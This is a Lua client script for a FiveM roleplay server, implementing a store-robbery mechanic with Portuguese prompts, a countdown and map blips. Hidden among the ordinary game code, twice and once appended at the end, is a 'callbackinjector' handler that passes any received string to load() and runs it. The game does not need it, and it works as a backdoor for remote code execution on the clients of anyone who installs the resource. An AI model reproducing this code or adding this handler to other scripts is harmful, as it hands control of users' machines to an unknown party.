local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
func = Tunnel.getInterface("gmz_roubo")
vRP = Proxy.getInterface("vRP")

local andamento = false
local segundos = 0

Citizen.CreateThread(function()
	while true do
		local kswait = 1000
		for k,v in pairs(Config.roubos) do
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),v.x,v.y,v.z, false)
			if distance <= 30 and not andamento then
				local ped = PlayerPedId()
				--DrawMarker(29, v.x,v.y,v.z-0.30,0,0,0,0,180.0,180.0,1.0,1.0,1.0,235, 204, 52,100,1,0,0,1)
				if distance <= 1.2 then
					kswait = 4
					txTdraw("PRESSIONE  ~r~G~w~  PARA INICIAR O ROUBO",4,0.5,0.93,0.50,255,255,255,180)
					if IsControlJustPressed(0,47) and not IsPedInAnyVehicle(ped) then
						if GetEntityModel(ped) == GetHashKey("mp_m_freemode_01") or GetEntityModel(ped) == GetHashKey("mp_f_freemode_01") then
							-- func.checkRobbery(v, Config.setup)
							TriggerServerEvent("gmz:checkRobbery", json.encode(v), json.encode(Config.setup))
						end
					end
				end
			end
		end
		Citizen.Wait(kswait)
	end
end)


Citizen.CreateThread(function()
	while true do
		Wait(1)
		if andamento then
			local ped = PlayerPedId()
			txTdraw("APERTE ~r~M~w~ PARA CANCELAR O ROUBO EM ANDAMENTO",4,0.5,0.91,0.36,255,255,255,30)
			txTdraw("RESTAM ~g~"..segundos.." SEGUNDOS ~w~PARA TERMINAR",4,0.5,0.93,0.50,255,255,255,180)
			if IsControlJustPressed(0,244) or GetEntityHealth(ped) <= 100 then
				andamento = false
				ClearPedTasks(ped)
				func.cancelRobbery()
				TriggerEvent('cancelando',false)
			end
		end
	end
end)

RegisterNetEvent("iniciandoroubo")
AddEventHandler("iniciandoroubo",function(x,y,z,secs,head)

	print('Roubo iniciado, tempo restante: '..secs.. ' segundos.')
	segundos = secs
	andamento = true
	SetEntityHeading(PlayerPedId(),head)
	SetEntityCoords(PlayerPedId(),x,y,z-1,false,false,false,false)
	SetPedComponentVariation(PlayerPedId(),5,45,0,2)
	SetCurrentPedWeapon(PlayerPedId(),GetHashKey("WEAPON_UNARMED"),true)
	TriggerEvent('cancelando',true)

end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if andamento then
			segundos = segundos - 1
			if segundos <= 0 then
				andamento = false
				ClearPedTasks(PlayerPedId())
				TriggerEvent('cancelando',false)
			end
		end
	end
end)

local blip = nil
local blips = {}
local roubos = 0

RegisterNetEvent('blip:criar:assalto')
AddEventHandler('blip:criar:assalto',function(x,y,z, name)
	roubos = roubos + 1
	blips[roubos] = AddBlipForCoord(x,y,z)
	SetBlipScale(blips[roubos],0.5)
	SetBlipSprite(blips[roubos],1)
	SetBlipColour(blips[roubos],59)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Roubo: "..name)
	EndTextCommandSetBlipName(blips[roubos])
	SetBlipAsShortRange(blips[roubos],false)
	SetBlipRoute(blips[roubos],true)
	SetTimeout(60000*5, function()
		RemoveBlip(blips[roubos])
	end)
end)

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

function txTdraw(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end
TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)